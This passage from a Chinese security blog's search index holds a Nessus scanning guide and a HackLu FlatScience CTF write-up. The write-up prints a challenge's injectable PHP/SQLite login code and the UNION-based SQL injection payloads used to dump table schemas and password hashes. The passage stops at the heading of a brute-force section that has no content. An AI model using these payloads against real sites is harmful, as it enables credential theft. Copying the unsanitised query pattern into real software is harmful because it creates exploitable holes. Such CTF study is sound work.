rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/77749008" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77749008</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus 使用指南</title>
      <link href="/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>NESSUS 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用NESSUS 作为扫描该机构电脑系统的软件。</p><a id="more"></a><h1 id="Nessus-使用指南"><a href="#Nessus-使用指南" class="headerlink" title="Nessus 使用指南"></a>Nessus 使用指南</h1><h2 id="0x01创建策略"><a href="#0x01创建策略" class="headerlink" title="0x01创建策略"></a>0x01创建策略</h2><p>进入主页面后点击policies</p><p><img src="https://i.imgur.com/UKPKn8z.png" alt></p><p>然后创建一个新策略</p><p><img src="https://i.imgur.com/kcgt20y.png" alt></p><p>进去后会有已经列出的策略选项，我们点击Advanced Scan，高级扫描</p><p><img src="https://i.imgur.com/Gq2m3ET.png" alt></p><h2 id="0x02配置策略"><a href="#0x02配置策略" class="headerlink" title="0x02配置策略"></a>0x02配置策略</h2><p>在Advanced Scan中会看到除了Credentials(登录扫描)还多了两项Compliance(合规性检测)和Plugins(扫描插件)配置。</p><p><img src="https://i.imgur.com/3942etv.png" alt></p><p>在这里我们进行常规的的配置。</p><h2 id="0x03高级配置"><a href="#0x03高级配置" class="headerlink" title="0x03高级配置"></a>0x03高级配置</h2><p>由于其他配置与基础扫描时一致的所以，现在重点介绍下高级扫描的DISCOVERY，ASSESSMENT，Credentials首先是DISCOVERY，这个栏目包含Host Discovery(主机发现)，Port Scanning(端口发现)，Service Discovery(服务发现)。主机发现中一般要开启Ping功能其他的需要按照需求进行配置，比较全面的扫描建议勾选Ping Methods中UDP选项，会降低效率,和准确性，由于日常资产收集只对服务器进行资产统计，不对网络设备和打印机等进行统计，所以Fragile Devices中的内容不进行设置。</p><p><img src="https://i.imgur.com/kgFBF1n.png" alt></p><p><img src="https://i.imgur.com/lyNUsGP.png" alt></p><p>接下来进行端口扫描，在进行常规扫描时我们按照默认的设置就可以完成扫描，需要进行全部端口的扫描或者进行防火墙探测时我们就需要自定义参数</p><p><img src="https://i.imgur.com/FV29K9J.png" alt="端口扫描"></p><p>接下来的服务发现我们也需要将发现范围设置为全部端口以提高准确率</p><p><img src="https://i.imgur.com/t22LNhe.png" alt></p><p>下面的ASSESSMENT(安全认证)/Genereal一般不需设置，这里就省略。</p><p>Brute Force 勾选General Settings可以防止账号被锁定。</p><p><img src="https://i.imgur.com/TDQot05.png" alt></p><p> 在Settings / assessment / Web Applications，可以对Web应用进行测试，可以根据实际需求进行配置。</p><p><img src="https://i.imgur.com/IDjSxs4.png" alt></p><p>Windows选项中可以枚举SMB域，一般使用默认配置。</p><p>在REPORT中只需设置报告的详细程度</p><p><img src="https://i.imgur.com/6PGS6CP.png" alt></p><p>在Credentials中我们可以进行登陆扫描</p><p><img src="https://i.imgur.com/cTbfXjS.png" alt></p><p>在Plugins中我们可以进行具体的插件选择</p><p><img src="https://i.imgur.com/SREIZoC.png" alt></p><p>点击SAVE后我们新建一个扫描</p><p><img src="https://i.imgur.com/Vgc0e1i.png" alt></p><p><img src="https://i.imgur.com/UHO2Yt8.png" alt></p><p>点击Launch开始扫描</p><h2 id="生成结果报告"><a href="#生成结果报告" class="headerlink" title="生成结果报告"></a>生成结果报告</h2><p>查看已完成的扫描可以看到具体的漏洞信息</p><p><img src="https://i.imgur.com/gDNENXH.png" alt></p><p>将结果导出</p><p><img src="https://i.imgur.com/PDT3Ran.png" alt></p><p>在生成的报告中我们可以看到相关信息</p><p><img src="https://i.imgur.com/OjRYT2I.png" alt></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>Nessus是一款非常强大的漏洞扫描与分析软件，我们甚至可以找到某一个漏洞的CVE号来进行针对与某一具体已公布的漏洞来进行扫描。</p><p>需要注意的是在进行扫描之前我们应该有目的的进行扫描，如果盲目的扫不仅浪费时间而且扫描的结果并不好。</p><p>这里给出几个公布漏洞的网站，方便查询：</p><ul><li><blockquote><p><a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a></p><p><a href="https://bugs.leavesongs.com/" target="_blank" rel="noopener">https://bugs.leavesongs.com/</a></p><p><a href="https://wooyun.website/" target="_blank" rel="noopener">https://wooyun.website/</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackLu FlatScience WP</title>
      <link href="/2017/03/23/HackLu-Flatscience-WP/"/>
      <url>/2017/03/23/HackLu-Flatscience-WP/</url>
      
        <content type="html"><![CDATA[<p>its so hard for me to write script!</p><a id="more"></a><h1 id="HackLu-FlatScience-WP"><a href="#HackLu-FlatScience-WP" class="headerlink" title="HackLu FlatScience WP"></a>HackLu FlatScience WP</h1><hr><h2 id="0x01-用到的东西"><a href="#0x01-用到的东西" class="headerlink" title="0x01 用到的东西"></a>0x01 用到的东西</h2><ol><li>robots.txt</li><li>对sqlite数据库了解</li><li>代码审计</li><li>sql注入</li><li>python写爆破脚本</li></ol><h2 id="0x02-robots-txt"><a href="#0x02-robots-txt" class="headerlink" title="0x02 robots.txt"></a>0x02 robots.txt</h2><p>刚拿到题确实一筹莫展，没什么经验。查看robots文件之后尝试登录./login.php</p><p><img src="https://i.imgur.com/E9wLCCI.png" alt="robots.txt"></p><p><img src="https://i.imgur.com/kJafN4R.png" alt="login.php"></p><h2 id="0x03-SQLite-数据库结构"><a href="#0x03-SQLite-数据库结构" class="headerlink" title="0x03 SQLite 数据库结构"></a>0x03 SQLite 数据库结构</h2><ol><li><p>SQLite3数据库Sql_master表结构</p><ol><li><p>储存在根页中，是系统表，与mysql中的information_schema表类似，储存了该数据库中各个表的信息的建表SQL语句。</p></li><li><p>如图<img src="https://i.imgur.com/lSrD5AX.png" alt="SQLite3结构"></p></li><li><p>基础的查询语句有<br><code>select * from sqlite_master WHERE type=&quot;table&quot;;</code> 可以查询到当前数据库中所有表的详细信息。</p><h2 id="0x04-代码审计"><a href="#0x04-代码审计" class="headerlink" title="0x04 代码审计"></a>0x04 代码审计</h2><p>传入debug之后得到源码</p><p><a href="http://111.198.29.45:30157/login.php?debug" target="_blank" rel="noopener">http://111.198.29.45:30157/login.php?debug</a></p><?phpif(isset($_POST['usr']) && isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");if($res){ $row = $res->fetchArray();}else{ echo "<br>Some Error occourred!";}if(isset($row['id'])){     setcookie('name',' '.$row['name'], time() + 60, '/');     header("Location: /");     die();}}if(isset($_GET['debug']))highlight_file('login.php');?><p> </p></li></ol></li></ol><p>可以看出使用了SQLite3数据库，对post的参数没有过滤直接进行了查询。如果查询到了id就执行setcookie操作，将name字段内容加进cookie里，时间+60s。所以我们可以尝试POST参数注入。</p><p>  <code>usr=admin&#39; union select name,sql from sqlite_master limit 1,1--+&amp;pw=admin</code></p><p>这时执行的查询语句就变成了这样</p><p><code>SELECT id,name from Users where name=&#39;admin&#39; union select name,sql from sqlite_master limit 1,1-- and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;</code><br>查看返回的cookie，name的value是查到的sql建表语句，id是查到的name.</p><p><img src="https://i.imgur.com/NnolACR.png" alt="cookie的值"><br>可以看出数据库的结构是</p><pre><code> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code></pre><p>这样就知道了表名和字段名，接下来就可以得到内容</p><pre><code>    &apos; union select id,name from Users limit 0,1&apos; union select id,password from Users limit 0, 1&apos; union select id,hint from Users limit 0,1</code></pre><p>具体内容如下<br><img src="https://i.imgur.com/ynG34iE.png" alt></p><p>尝试CMD5破解admin的密码，没查出来，根据hint用网站的pdf里面的词爆破。（也可以看到密码进行了SHA1+salt的加密）</p><h2 id="0x05-python爆破"><a href="#0x05-python爆破" class="headerlink" title="0x05 python爆破"></a>0x05 python爆破</h2>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
